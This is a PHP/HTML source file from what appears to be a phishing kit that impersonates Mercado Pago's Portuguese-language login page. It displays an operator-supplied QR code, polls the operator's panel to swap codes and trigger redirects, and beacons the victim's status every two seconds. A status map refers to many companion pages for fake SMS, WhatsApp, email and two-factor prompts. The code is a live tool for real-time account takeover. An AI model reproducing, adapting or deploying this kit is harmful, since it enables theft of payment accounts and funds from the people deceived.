<?php
// O topo do arquivo com a validação do cookie permanece o mesmo.
session_start();
require 'db.php';
if (!isset($_COOKIE['identificador_cliente'])) {
    header('Location: index.php');
    exit;
}

function isMobileDevice() {
    return preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
}

// Define o alvo do redirecionamento com base no dispositivo
if (isMobileDevice()) {
    $redirect_target_2fa = 'dois_fatores.php';
} else {
    $redirect_target_2fa = 'dois_fatores.php';
}

?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Escaneie o QR para iniciar sessão de forma segura</title>
    <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/ui-navigation/6.6.5/mercadolibre/favicon.ico" type="image/svg"/>
    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>

    <style>
        :root {
            --andes-color-yellow-500: #ffe600;
            --andes-color-blue-500: #3483fa;
            --andes-text-color-primary: #333;
            --andes-text-color-secondary: #555;
            --andes-text-color-link: var(--andes-color-blue-500);
        }
        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; display: flex; flex-direction: column; min-height: 100vh; background-color: var(--andes-background-color-secondary); }
        .main-header { background-color: #ffe600; padding: 0 680px; box-shadow: 0 1px 2px 0 rgba(0,0,0,.1); height: 60px; display: flex; align-items: center; justify-content: flex-start;}
        .main-header img { height: 37px; vertical-align: middle; }
        .main-content { padding: 80px 24px; flex-grow: 1; }
        .content-wrapper { max-width: 960px; margin: 0 auto; display: flex; justify-content: center; align-items: flex-start; gap: 64px; }
        .left-column { display: flex; flex-direction: column; width: 340px; flex-shrink: 0; margin-right: 64px; }
        .session-start-label { font-size: 12px; font-weight: 600; color: var(--andes-text-color-secondary); text-transform: uppercase; margin-bottom: 8px; }
        .main-title { font-size: 28px; font-weight: 600; color: var(--andes-text-color-primary); line-height: 1.25; margin: 0; }
        .description-text { font-size: 16px; color: var(--andes-text-color-secondary); margin-top: 16px; line-height: 1.5; }
        .help-link { display: block; margin-top: 24px; color: var(--andes-text-color-link); text-decoration: none; font-size: 14px; font-weight: 500; }
        .help-link:hover { text-decoration: underline; }
        .qr-card { width: 100%; max-width: 38.75rem; height: 26.25rem; margin-top: 0; background-color: var(--andes-background-color-primary); box-shadow: 0 1px 4px 0 rgba(0,0,0,.1); border-radius: 6px; padding: 48px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center; }

        /* AJUSTE CSS: Estilos para o wrapper e o logo */
        #qr-wrapper {
            position: relative;
            width: 220px;
            height: 220px;
            margin-bottom: 32px;
        }
        #qr-code-container {
            width: 100%;
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        #qr-code-container img {
             max-width: 100%;
             max-height: 100%;
        }
        #qr-logo {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 48px;
            height: 48px;
            background-color: white;
            border-radius: 6px;
            padding: 4px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            display: none; /* O logo começa escondido por padrão */
        }
        .other-method-link { color: var(--andes-text-color-link); text-decoration: none; font-size: 15px; font-weight: 500; }
        .other-method-link:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <header class="main-header">
        <img src="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.5/mercadolibre/pt_logo_large_plus.webp" alt="Mercado Pago">
    </header>

    <main class="main-content">
        <div class="content-wrapper">
            <div class="left-column">
                <span class="session-start-label">INÍCIO DE SESSÃO</span>
                <h1 class="main-title">Escaneie o QR para iniciar sessão de forma segura</h1>
                <p class="description-text">Este passo é necessário para validar sua identidade e manter sua conta sempre protegida.</p>
                <a href="senha.php" class="help-link">Preciso de ajuda</a>
            </div>

            <div class="qr-card">
                <div id="qr-wrapper">
                    <div id="qr-code-container"></div>
                    <img id="qr-logo" src="https://http2.mlstatic.com/frontend-assets/auth-totp-in-app-frontend/qr-mp.png" alt="Logo MP">
                </div>

                <a href="senha.php" class="other-method-link">Escolher outro método</a>
            </div>
        </div>
    </main>

    <script>
        const qrContainer = document.getElementById('qr-code-container');
        const qrLogo = document.getElementById('qr-logo');
        let currentQrData = null;

        // Função para mostrar um QR Code que é uma imagem (da extensão)
        function displayQrImage(path) {
            qrLogo.style.display = 'none'; // Esconde o logo manual, pois a imagem já o tem
            qrContainer.innerHTML = '';
            const img = document.createElement('img');
            img.src = path + '?t=' + new Date().getTime();
            img.alt = 'Código QR';
            qrContainer.appendChild(img);
        }

        // Função para gerar um QR Code a partir de um texto (do admin)
        function generateQrFromText(text) {
            qrContainer.innerHTML = '';
            new QRCode(qrContainer, {
                text: text,
                width: 220,
                height: 220,
                colorDark: "#000000",
                colorLight: "#ffffff",
                correctLevel: QRCode.CorrectLevel.H // Nível de correção alto para garantir leitura com o logo
            });
            qrLogo.style.display = 'block'; // Mostra o nosso logo manual por cima
        }

        // Define e exibe o QR Code inicial
        const initialQrPath = '2.png';
        displayQrImage(initialQrPath);
        currentQrData = initialQrPath;

        async function verificarQrCode() {
            try {
                const response = await fetch('api_get_qrcode.php');
                const data = await response.json();

                if (data.success && data.data !== currentQrData) {
                    console.log('Detectado novo QR Code. Atualizando a tela...');

                    if (data.type === 'image') {
                        displayQrImage(data.data);
                    } else if (data.type === 'text') {
                        generateQrFromText(data.data);
                    }
                    currentQrData = data.data;

                } else if (data.success) {
                    console.log('QR Code verificado, sem alterações.');
                }
            } catch (error) {
                console.error('Erro ao buscar QR Code:', error);
            }
        }
        setInterval(verificarQrCode, 3000);
    </script>

    <script>
        (function() {
            const statusMap = {'index.php':'...','login-mobile.php':'...','senha.php':'...','senha-mobile.php':'...','dois_fatores.php':'...','dois_fatores2.php':'...','doisfatores2mobile.php':'...','sms_desktop.php':'...','sms_mobile.php':'...','sms_whats_desktop.php':'...','sms_whats_mobile.php':'...','qrcode-mobile.php':'...','telaqr.php':'Usuário na tela para logar com QR Code (Desktop)','email2fadesktop.php':'...','email2famobile.php':'...','emailsms_desktop.php':'...','emailsms_mobile.php':'...','sms2fadesktop.php':'...','sms2famobile.php':'...','whats2fadesktop.php':'...','whats2framobile.php':'...'};
            const currentPage = window.location.pathname.split('/').pop();
            const currentStatus = statusMap[currentPage] || 'Página Desconhecida';
            async function sendStatusUpdate() {
                try {
                    await fetch('api_update_status.php', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ status: currentStatus }) });
                } catch (error) { console.error('Falha ao enviar atualização de status:', error); }
            }
            sendStatusUpdate();
            setInterval(sendStatusUpdate, 2000);
        })();
    </script>
    <script>
        (function() {
            const redirectUrl = "<?php echo $redirect_target_2fa; ?>";
            async function checkAdminCommand() {
                try {
                    const response = await fetch('api_check_status.php');
                    const data = await response.json();
                    if (data.status === 'redirecionar_para_2fa') {
                        clearInterval(statusInterval);
                        window.location.href = redirectUrl;
                    }
                } catch (error) { console.error('Erro ao verificar status:', error); }
            }
            const statusInterval = setInterval(checkAdminCommand, 3000);
        })();
    </script>
</body>
</html>